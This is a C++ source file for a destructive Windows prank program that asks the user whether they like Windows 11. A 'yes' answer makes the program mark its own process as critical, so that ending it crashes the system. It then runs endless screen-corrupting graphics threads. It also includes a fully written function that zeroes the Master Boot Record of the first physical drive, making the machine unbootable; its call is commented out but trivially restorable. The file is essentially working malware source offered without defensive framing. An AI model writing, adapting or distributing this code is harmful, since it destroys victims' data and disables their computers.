#include <windows.h>
#include <stdio.h>
#include <iostream>
#pragma warning(default:4716)
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProtectProcess()
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}
#define Bit BitBlt
#define G GetSystemMetrics
static ULONGLONG r, n;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

DWORD WINAPI payload1(LPVOID lpParam)
{
	HDC DES = GetDC(0);
	int w = G(0), h = G(1);
	for (int i = 0;; i++) {
		int(a) = randy() % w, b = randy() % h;
		Bit(DES, a, b, 200, 200, DES, a + randy() % 21 - 10, b + randy() % 21 - 10, !(randy() & 3) ? 0xEE0086 : 0xCC0020);
	}
}

DWORD WINAPI payload3(LPVOID lpParam)
{
	HDC DES = GetDC(0);
	int w = G(0), h = G(1);
	for (int i = 0;; i++) {
		int(a) = randy() % w, b = randy() % h;
		Bit(DES, a, b, 500, 500, DES, a + randy() % 51 - 20, b + randy() % 51 - 20, !(randy() & 6) ? 0xEE0196 : 0xCC0320);
	}
}

DWORD WINAPI payload2(LPVOID lpParam)
{
	int tymez = GetTickCount64();
	int w = G(0), h = G(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		(w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		if (!1)RedrawWindow(0, 0, 0, 133);
		HDC payload2 = GetDC(0), payload20 = CreateCompatibleDC(payload2); HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(payload20, hbm);
		Bit(payload20, 0, 0, w, h, payload2, 0, 0, 0x330008); GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE dfasdf = 0;
		if ((GetTickCount64() - tymez) > 60000)
			dfasdf = randy() & 0xff;
		for (int i = 0; /* */ w * h > i; i++) {
			if (i % h == 0 && randy() % 100 == 0)
				v = randy() % 50;
			((BYTE*)(data + i))[v % 3] += ((
				BYTE*)(data + i + v))[v] ^
				dfasdf;
		}
		SetBitmapBits(hbm, w * h * 4, data); Bit(payload2, randy() % 3 - 1, randy() % 3 - 1, w, h, payload20, 0, 0, 0xCC0020);
		DeleteObject(hbm); DeleteObject(payload20);
		DeleteObject(payload2);
	}
}

DWORD WINAPI payload4(LPVOID lpParam)
{
	int tymez = GetTickCount();
	int w = G(0), h = G(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		(w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	for (int i = 0;; i++, i %= 4) {
		if (!1)RedrawWindow(0, 0, 0, 420);
		HDC payload4 = GetDC(0), payload40 = CreateCompatibleDC(payload4); HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(payload40, hbm);
		Bit(payload40, 0, 0, w, h, payload4, 0, 0, 0x3300420); GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE dfasdf = 0;
		if ((GetTickCount() - tymez) > 60000)
			dfasdf = randy() & 0xff;
		for (int i = 0; /* */ w * h > i; i++) {
			if (i % h == 0 && randy() % 100 == 0)
				v = randy() % 50;
			((BYTE*)(data + i))[v % 3] += ((
				BYTE*)(data + i + v))[v] ^
				dfasdf;
		}
		SetBitmapBits(hbm, w * h * 4, data); Bit(payload4, randy() % 4 - 2, randy() % 4 - 2, w, h, payload40, 0, 0, 0xCC0420);
		DeleteObject(hbm); DeleteObject(payload40);
		DeleteObject(payload4);
	}
}
DWORD WINAPI mbr(LPVOID lpParam) {
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
}
DWORD WINAPI payload5(LPVOID lpParam)
{
	int tymez = GetTickCount64();
	int w = G(0), h = G(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0,
		(w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);
	for (int i = 0;; i++, i %= 4) {
		if (!1)RedrawWindow(0, 0, 0, 810);
		HDC payload5 = GetDC(0), payload50 = CreateCompatibleDC(payload5); HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(payload50, hbm);
		Bit(payload50, 0, 0, w, h, payload5, 0, 0, 0x3300420); GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE dfasdf = 0;
		if ((GetTickCount64() - tymez) > 80000)
			dfasdf = randy() & 0xff;
		for (int i = 0; /* */ w * h > i; i++) {
			if (i % h == 0 && randy() % 100 == 0)
				v = randy() % 50;
			((BYTE*)(data + i))[v % 3] += ((
				BYTE*)(data + i + v))[v] ^
				dfasdf;
		}
		SetBitmapBits(hbm, w * h * 8, data); Bit(payload5, randy() % 8 - 4, randy() % 8 - 1, w, h, payload50, 0, 0, 0xCC0810);
		DeleteObject(hbm); DeleteObject(payload50);
		DeleteObject(payload5);
	}
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
	if (MessageBoxA(NULL, "do you like Windows 11?", "Windows11.exe", MB_YESNO) == IDYES)
	{
		ProtectProcess();
		//CreateThread(0, 0, mbr, 0, 0, 0);
		MessageBoxA(NULL, "You Will Pay For Liking Windows 11!", "", MB_ICONINFORMATION | MB_OK);
		Sleep(20000);
		MessageBoxA(NULL, "&*&*@#&!*@&*&@*&###########r*&@#&*#&@*(#&*r#@&@*&*@$&*&$*&$*&*", "", MB_ICONHAND | MB_OK);		CreateThread(0, 0, payload1, 0, 0, 0);
		Sleep(20000);
		CreateThread(0, 0, payload2, 0, 0, 0);
		Sleep(20000);
		CreateThread(0, 0, payload3, 0, 0, 0);
		Sleep(10000);
		CreateThread(0, 0, payload4, 0, 0, 0);
		Sleep(10000);
		CreateThread(0, 0, payload5, 0, 0, 0);
		Sleep(-1);
	}
	else
	{
		MessageBoxA(NULL, "I trust you", "", MB_OK);
	}
}